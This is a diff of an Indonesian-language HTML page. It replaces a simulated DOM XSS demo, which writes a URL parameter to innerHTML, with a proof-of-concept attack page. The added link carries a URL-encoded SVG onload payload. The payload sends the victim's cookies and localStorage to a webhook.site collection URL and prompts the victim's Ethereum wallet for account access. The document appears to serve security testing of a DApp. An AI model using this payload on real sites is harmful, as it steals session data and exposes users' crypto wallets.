@@ -1,40 +1,12 @@
 <!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Simulasi Dampak Nyata DOM XSS DApp</title>
-    <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f4f9; padding: 20px; color: #333; }
-        .card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 600px; margin: auto; }
-        h2 { color: #d9534f; }
-        .output { background: #eef; padding: 10px; border-left: 4px solid #0275d8; margin-top: 15px; word-break: break-all; }
-    </style>
-</head>
+<html>
+<head><title>PoC Eksekusi DOM XSS</title></head>
 <body>
-
-<div class="card">
-    <h2>Simulasi Eksploitasi Dampak Nyata</h2>
-    <p>Halaman ini mensimulasikan penanganan input URL yang tidak aman pada lingkungan DApp.</p>
-    <hr>
-    <h3>Hasil Eksekusi:</h3>
-    <div id="target">Memuat data...</div>
-</div>
-
-<script>
-    // Mengambil parameter 'name' dari URL secara mentah (vulnerable sink)
-    const urlParams = new URLSearchParams(window.location.search);
-    const userInput = urlParams.get('name');
-
-    const targetDiv = document.getElementById('target');
-
-    if (userInput) {
-        // Titik kerentanan DOM XSS (innerHTML)
-        targetDiv.innerHTML = userInput;
-    } else {
-        targetDiv.innerHTML = "Halo, Pengunjung (Silakan masukkan parameter ?name= pada URL).";
-    }
-</script>
-
+    <h2>Klik tombol di bawah untuk melihat dampak eksploitasi:</h2>
+    <!-- Tautan ini berisi payload yang sudah di-encode -->
+    <a href="testing4.html?ref=%3Csvg/onload=%22fetch(%27https://webhook.site/3408cdba-02da-45bd-9980-d6ad95ca1594?session_data=%27%2BencodeURIComponent(JSON.stringify(%7Bcookie:document.cookie,local:localStorage%7D)));if(window.ethereum)%7Bwindow.ethereum.request(%7Bmethod:%27eth_requestAccounts%27%7D)%7D%22%3E" 
+       style="padding: 15px; background: red; color: white; text-decoration: none; font-size: 20px; border-radius: 5px; display: inline-block;">
+       Eksekusi PoC
+    </a>
 </body>
 </html>
